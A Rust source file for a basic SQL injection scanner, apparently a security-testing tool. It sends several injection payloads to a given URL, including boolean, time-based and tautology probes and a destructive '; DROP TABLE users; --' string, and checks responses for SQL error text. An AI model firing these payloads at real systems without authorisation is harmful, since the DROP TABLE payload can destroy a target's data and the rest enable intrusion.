use reqwest::Client;

pub async fn validation_exist_sql_injection(
    url: &str,
    payload: &str) -> Result<(), reqwest::Error> {

    let client = Client::new();

    match payload {
        "1" => {
            let set_payloads = vec!["' OR '1'='1", "'; DROP TABLE users; --"];

            for set_payload in set_payloads {
                if let Err(error) = response(client.clone(), url, set_payload).await {
                    println!("Request error: {}", error);
                }
            }
        },
        "2" => {
            let set_payloads = vec!["'; WAITFOR DELAY '00:00:05'--"];

            for set_payload in set_payloads {
                if let Err(error) = response(client.clone(), url, set_payload).await {
                    println!("Request error: {}", error);
                }
            }
        },
        "3" => {
            let set_payloads = vec!["' AND 1=1 --", "' AND 1=0 --"];

            for set_payload in set_payloads {
                if let Err(error) = response(client.clone(), url, set_payload).await {
                    println!("Request error: {}", error);
                }
            }
        },
        "4" => {
            let set_payloads = vec!["' OR 1=1 --", "' OR 1=0 --"];

            for set_payload in set_payloads {
                if let Err(error) = response(client.clone(), url, set_payload).await {
                    println!("Request error: {}", error);
                }
            }
        }
        _ => println!("Options not found")
    }

    Ok(())
}

async fn response(
    client: Client,
    url: &str,
    payload: &str) -> Result<(), reqwest::Error> {

    let test_url = format!("{}{}", url, payload);
    println!("... Testing");

    let response = client.get(test_url).send().await?;

    if response.status().is_success() {
        let body = response.text().await?;
        contains_sql_injection(body);
    } else {
        println!("Failed to make the request")
    }

    Ok(())
}

fn contains_sql_injection(body: String) {
    if body.contains("mysql_fetch_array()") || body.contains("SQL syntax") {
        println!("Using this URL it is possible to carry out a SQL Injection attack");
    } else {
        println!("No vulnerabilities found");
    }
}